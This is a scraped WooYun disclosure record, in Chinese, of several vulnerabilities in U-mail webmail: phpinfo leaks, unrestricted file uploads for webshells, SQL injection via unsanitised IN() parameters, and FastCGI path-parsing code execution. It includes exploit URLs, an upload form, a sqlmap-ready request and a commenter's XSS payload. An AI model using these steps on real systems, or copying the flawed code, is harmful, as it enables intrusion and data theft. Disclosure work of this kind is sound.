{"id": 1876, "wybug_id": "wooyun-2014-062257", "wybug_title": " U-mail 最新版漏洞大阅兵(信息泄露，多个getshell，多处SQL注入漏洞，远程代码执行)", "wybug_corp": "U-mail", "wybug_author": "路人甲", "wybug_date": "2014-05-25 12:38", "wybug_open_date": "2014-08-23 12:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向公众公开  简要描述： 疯狗、 xsser  finger求打雷 详细说明：  注：一个getshell重复http://wooyun.org/bugs/wooyun-2014-059954疯狗、 xsser  finger求打雷1、\t信息泄露 (phpinfo信息泄露)  http://www.xxx.com/webmail/client/mail/index.php?module=test&action=info phpinfo()信息泄露\n其中源码如下：WorldClient\\html\\client\\mail\\module\\info.phpif ( !defined( \"PRELOAD_OK\" ) ){\t\texit( \"error\" );}require_once( LIB_PATH.\"Mailbox.php\" );require_once( LIB_PATH.\"Widget.php\" );$Mailbox = Mailbox::getinstance( );$Widget = Widget::getinstance( );$Domain = Domain::getinstance( );$email = get_session( \"email\" );$user_id = get_session( \"user_id\" );$domain_id = get_session( \"domain_id\" );phpinfo( );?>\nExp:  http://mail.comingchina.com/webmail/client/mail/index.php?module=test&action=info官方测试截图如下：\n\n2、\t 信息泄露（phpinfo）在根目录当中有info.php该文件….  地址为：http://mail.comingchina.com/webmail/info.php\n\n3、\t网站物理路径信息泄露http://mail.comingchina.com/webmail/customer/autoresp.phphttp://mail.comingchina.com/webmail/client/mail/index.php?module=operate&action=attach-packdown\n\n\n\n4、\t任意文件上传getshellhttp://192.168.56.128/webmail/client/mail/index.php?module=operate&action=attach-uploadWorldClient\\html\\client\\mail\\module\\o_attach.php中\nif ( ACTION == \"attach-upload\" ){\t\tif ( $_FILES )\t\t{\t\t\t\t$file_name = $_FILES['Filedata']['name'];\t\t\t\t$file_type = $_FILES['Filedata']['type'];\t\t\t\t$file_size = $_FILES['Filedata']['size'];\t\t\t\t$file_source = $_FILES['Filedata']['tmp_name'];\t\t\t\t$file_suffix = getfilenamesuffix( $file_name ); //取后缀名\t\t\t\t$path_target = getusercachepath( );\t\t\t\tdo\t\t\t\t{\t\t\t\t\t\t$file_id = makerandomname( );\t\t\t\t\t\t$file_target = $path_target.$file_id.\".\".$file_suffix;\t\t\t\t} while ( file_exists( $file_target ) );\t\t\t\tif ( !move_uploaded_file( $file_source, $file_target ) ) //未进行任何判断，直接写入了。。。。\t\t\t\t{\t\t\t\t\t\tdump_json( array(\t\t\t\t\t\t\t\t\"status\" => 0,\t\t\t\t\t\t\t\t\"message\" => el( \"写入文件出错，请与管理员联系！\", \"\" )\t\t\t\t\t\t) );\t\t\t\t}\t\t\t\t$_SESSION[SESSION_ID]['attach_cache'][] = array(\t\t\t\t\t\t\"id\" => $file_id,\t\t\t\t\t\t\"name\" => $file_name,\t\t\t\t\t\t\"type\" => \"1\",\t\t\t\t\t\t\"path\" => $file_target,\t\t\t\t\t\t\"size\" => $file_size\t\t\t\t);\t\t\t\tdump_json( array(\t\t\t\t\t\t\"status\" => \"1\",\t\t\t\t\t\t\"filename\" => $file_name,\t\t\t\t\t\t\"filesize\" => $file_size,\t\t\t\t\t\t\"file_id\" => $file_id\t\t\t\t) );\t\t}\n在上传之后，他会返回地址，如 \"file_id\" => $file_id 其中就将上传之后的文件名给回显出来了。。\n\n我们访问下我们的马\n\nExp 如下：\n<form id=\"frmUpload\" enctype=\"multipart/form-data\"action=\"http://www.xxx.com/webmail/client/mail/index.php?module=operate&action=attach-upload-batch\" method=\"post\">Upload a new file:<br><input type=\"file\" name=\"Filedata\" size=\"50\"><br><input type=\"submit\" value=\"Upload\">\n5、\t任意文件上传getshell 之二http://www.xxx.com/webmail/client/mail/index.php?module=operate&action=attach-upload-batch其中只是多了个数组判断类型，也是同样方法getshell6、\tSQL注入漏洞一http://192.168.56.128/webmail/client/netdisk/index.php?module=operate&action=move&fid=3&file=1代码如下：\n$Netdisk->initTreeObject( $user_id, 0 );if ( ACTION == \"move\" ){\t\t$file_ids = gss( $_GET['file'] ); //无过滤，直接进入了\t\t$folder_ids = gss( $_GET['folder'] );\t\t$folder_id = gss( $_GET['fid'] );\t\tif ( !$folder_id )\t\t{\t\t\t\tdump_json( array( \"status\" => 0, \"message\" => \"参数错误！\" ) );\t\t}\t\tif ( $file_ids )\t\t{\t\t\t\t$where = \"user_id='\".$user_id.\"' AND file_id IN (\".$file_ids.\")\"; //传进来了，产生SQL注入漏洞\t\t\t\t$data = array(\t\t\t\t\t\t\"folder_id\" => $folder_id\t\t\t\t);\t\t\t\t$result = $Netdisk->update_file( $data, $where, 0 );\t\t\t\tif ( !$result )\t\t\t\t{\t\t\t\t\t\tdump_json( array( \"status\" => 0, \"message\" => \"移动文件时发生错误，移动失败！\" ) );\t\t\t\t}\t\t}\n抓包，然后放sqlmap当中\nGET /webmail/client/netdisk/index.php?module=operate&action=move&fid=3&file=1 HTTP/1.1Host: mail.comingchina.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: PHPSESSID=9c6ff50907e53333c9b81264c6ea0ef8Connection: keep-alive\n\n\n下面是官方的数据库列表如下：\n\n7、\tSQL注入漏洞二http://192.168.56.128/webmail/client/netdisk/index.php?module=operate&action=move&fid=3& folder=1此次SQL注入参数为：folder\nif ( $folder_ids )\t\t{\t\t\t\t$where = \"user_id='\".$user_id.\"' AND folder_id IN (\".$folder_ids.\")\"; //同理\t\t\t\t$data = array(\t\t\t\t\t\t\"parent_id\" => $folder_id\t\t\t\t);\t\t\t\t$result = $Netdisk->update_folder( $data, $where, 0 );\t\t\t\tif ( !$result )\t\t\t\t{\t\t\t\t\t\tdump_json( array( \"status\" => 0, \"message\" => \"移动文件夹时发生错误，移动失败！\" ) );\t\t\t\t}\t\t}\n同理SQL注入漏洞8、\t远程代码执行漏洞由于该邮件系统采用的是php+mysql架构而成，而运行php的方式是采用了fast-cgi的方式，如图：\n\n采用该方式，PHP-CGI远程任意代码执行漏洞其中任意文件可导致以php方式解析，类似于（nigx）如http://www.xxx.com/1.jpg/1.php\n\n只要上传任意一文件，都可导致代码执行。。。直接getshell发了这么多，能打个雷么？   漏洞证明：  \n\n   修复方案：  太多了，慢慢整   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-30 09:58 厂商回复： CNVD确认并复现所述情况，由CNVD通过公开渠道联系软件生产厂商深圳市福洽科技有限公司技术支持通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-25 12:49 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  牛B，是前台么？    \n     2014-05-25 12:51 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  擦，这是谁？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}